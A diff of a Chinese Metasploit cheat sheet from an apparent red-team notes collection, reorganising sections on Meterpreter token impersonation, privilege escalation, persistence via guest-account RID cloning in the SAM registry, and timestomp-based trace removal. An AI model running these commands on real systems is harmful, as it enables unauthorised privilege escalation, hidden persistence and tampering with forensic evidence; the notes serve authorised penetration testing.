@@ -1,7 +1,7 @@
 # Metasploit
 
 <p align="center">
-    <img src="../../../assets/img/logo/metasploit.png" width="20%"></a>
+    <img src="../../../assets/img/logo/metasploit.png" width="20%">
 </p>
 
 ---
@@ -18,16 +18,6 @@
 **文章/相关**
 - [MSF基础命令新手指南](https://www.jianshu.com/p/77ffbfc3a06c)
 - [[渗透神器系列]Metasploit](https://thief.one/2017/08/01/1/)
-- [给kali的Metasploit下添加一个新的exploit](https://blog.csdn.net/SilverMagic/article/details/40978081)
-- [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
-- [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)
-
-**Module database cache not built yet, using slow search**
-```bash
-service postgresql start
-msfdb init
-db_rebuild_cache
-```
 
 **图形化 UI**
 - [WayzDev/Kage](https://github.com/WayzDev/Kage)
@@ -87,6 +77,14 @@ deb-src http://mirrors.aliyun.com/kali kali-experimental main non-free contrib
 
 也可以直接使用 `msfupdate`
 
+**Module database cache not built yet, using slow search**
+> 注: 5.0.0 之后应该就不需要这个了
+```bash
+service postgresql start
+msfdb init
+db_rebuild_cache
+```
+
 **添加一个新的 exploit**
 
 1. 在 `/usr/share/metasploit-framework/modules/exploits/` 目录下新建一个自定义文件夹 aaatest,将 rb 脚本扔进去
@@ -96,7 +94,7 @@ deb-src http://mirrors.aliyun.com/kali kali-experimental main non-free contrib
 
 **msfvenom**
 
-使用 msfvenom 生成 payload 内容见 [权限维持](../笔记/RedTeam/权限维持.md#msfvenom)
+使用 msfvenom 生成 payload 内容见 [权限维持](../笔记/RedTeam/后渗透/权限维持.md#msfvenom)
 
 ---
 
@@ -173,6 +171,8 @@ getsystem   # 命令可以提权到本地系统权限
 sysinfo     # 显示系统名,操作系统,架构和语言等.
 ```
 
+---
+
 ### 获取会话
 
 **handler**
@@ -193,6 +193,8 @@ exploit -j  # 后台执行
 如果 meterpreter session 创建成功了,但很快就断连,此时应该修改使用的 payload,优先改成 generic/shell_reverse_tcp 等
 
 如果还不成功,切换回连端口或者改成 bind shell 试试
+
+---
 
 ### 信息收集
 
@@ -264,6 +266,8 @@ set pcapfile 1.cap
 run
 ```
 
+---
+
 ### 权限提升
 
 ```bash
@@ -282,7 +286,7 @@ getuid      # 再次查看判断是否提权成功
 
 2. UAC 如何运行？
 
-    UAC 通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行.除非尝试执行这些操作的进程以管理员权限运行,否则这些操作将无法运行.如果您以管理员身份运行程序,则它将具有更多权限,因为它将被"提升权限",而不是以管理员身份运行的程序.
+    UAC 通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行.除非尝试执行这些操作的进程以管理员权限运行,否则这些操作将无法运行.如果你以管理员身份运行程序,则它将具有更多权限,因为它将被"提升权限",而不是以管理员身份运行的程序.
 
     因为有的用户是没有管理员权限,没有管理员权限是运行不了那些只能通过管理员权限才能操作的命令.比如修改注册表信息、创建用户、读取管理员账户密码、设置计划任务添加到开机启动项等操作.
 
@@ -344,6 +348,23 @@ set session
 Exploit
 ```
 
+**令牌假冒**
+
+在用户登录 windows 操作系统时,系统都会给用户分配一个令牌(Token),当用户访问系统资源时都会使用这个令牌进行身份验证,功能类似于网站的 session 或者 cookie.
+
+msf 提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色.
+```bash
+getuid                              # 查看当前用户
+use incognito                       # 进入该模块
+list_tokens -u                      # 查看存在的令牌
+impersonate_token <Username>        # 令牌假冒
+# 注意用户名的斜杠需要写两个.
+
+getuid                              # 查看是否切换成功
+```
+
+---
+
 ### 文件操作
 
 **操作文件系统**
@@ -383,22 +404,9 @@ timestomp -v a.txt                  # 查看 a 的时间戳
 timestomp a.txt -f b.txt            # 使用 b 的时间覆盖 a 的时间
 ```
 
+---
+
 ### 横向
-
-**令牌假冒**
-
-在用户登录 windows 操作系统时,系统都会给用户分配一个令牌(Token),当用户访问系统资源时都会使用这个令牌进行身份验证,功能类似于网站的 session 或者 cookie.
-
-msf 提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色.
-```bash
-getuid                              # 查看当前用户
-use incognito                       # 进入该模块
-list_tokens -u                      # 查看存在的令牌
-impersonate_token <Username>        # 令牌假冒
-# 注意用户名的斜杠需要写两个.
-
-getuid                              # 查看是否切换成功
-```
 
 **域管理员嗅探**
 
@@ -407,6 +415,8 @@ use post/windows/gather/enum_domain
 set session 1
 exploit
 ```
+
+---
 
 ### 端口转发和内网代理
 
@@ -472,6 +482,8 @@ SRVHOST:监听的 ip 地址,默认为 0.0.0.0,一般不需要更改.
 SRVPORT:监听的端口,默认为 1080.
 直接运行 run 命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
 ```
+
+---
 
 ### 权限维持
 
@@ -589,6 +601,8 @@ net user guest /active:yes
 reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5
 ```
 
+---
+
 ### 痕迹清除
 
 ```bash
@@ -601,3 +615,10 @@ timestomp -v secist.txt                     # 查看当前目标文件 MACE 时�
 timestomp -f c:\\AVScanner.ini secist.txt   # 将模板文件 MACE 时间,复制给当前文件
 timestomp -v secist.txt
 ```
+
+---
+
+**Source & Reference**
+- [给kali的Metasploit下添加一个新的exploit](https://blog.csdn.net/SilverMagic/article/details/40978081)
+- [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
+- [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)
